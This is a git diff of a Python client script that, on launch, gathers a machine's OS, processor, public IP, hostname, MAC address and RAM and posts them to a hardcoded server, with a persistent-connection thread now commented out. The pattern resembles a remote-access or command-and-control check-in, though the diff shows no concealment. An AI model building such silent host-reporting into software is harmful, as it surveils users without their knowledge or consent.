@@ -4,21 +4,22 @@ import requests
 import platform 
 from client_functions import client_func
 import threading
-# import psutil
-
+import psutil
+from getmac import get_mac_address
 
 class main:
     def __init__(self):
-        self.base_url = "http://10.247.71.196:4969"
+        self.base_url = "http://10.247.71.196:6969"
         self.ip = "10.247.71.196"
         self.port = 4969
         self.grab_specs()
-        threading.Thread(target=self.constant_connection, args=()).start()
+        # threading.Thread(target=self.constant_connection, args=()).start()
     def grab_specs(self):
         self.os_type = platform.platform()
         self.processor = platform.processor()
-        # self.ram_amount = psutil.virtual_memory()
-        # self.ram_amount = get_size(self.ram_amount.total)
+        self.mac_address = get_mac_address()
+
+        self.ram_amount = convert_bytes(psutil.virtual_memory().total)
         try:
             self.ip_address = requests.get("https://api.ipify.org?format=json").json()["ip"]
         except:
@@ -27,21 +28,34 @@ class main:
         self.host_name = socket.gethostname()
 
     
-        print(self.os_type)
-        print(self.processor)
-        print(self.ip_address)
-        print(self.host_name)
+        # print(self.os_type)
+        # print(self.processor)
+        # print(self.ip_address)
+        # print(self.host_name)
+        self.upload_data()
 
     def upload_data(self):
+        print("Sending request...")
         send_data = requests.post(
             url = self.base_url + "/auth",
+            headers={
+                "content-type":"application/json"
+            },
             json = {
                 "hostname":self.host_name,
                 "ip_address":self.ip_address,
+                "os":platform.system(),
                 "os_type":self.os_type,
-                "processor":self.processor
+                "processor":self.processor,
+                "mac_address":self.mac_address,
+                "ram":self.ram_amount
+            },
+            # for the moment, it'll be test, we can update this later
+            cookies={
+                "X-API-KEY":"test"
             }
         )
+        print("Done")
         print(send_data.text)
     def constant_connection(self):
         try:
@@ -75,9 +89,12 @@ class main:
             
 
 
+def convert_bytes(B):
+    GB = float(1024 ** 3) 
+    return '{0:.2f} GB'.format(B / GB)
 
 
-    
+
 a = main()
 
 # a.upload_data()
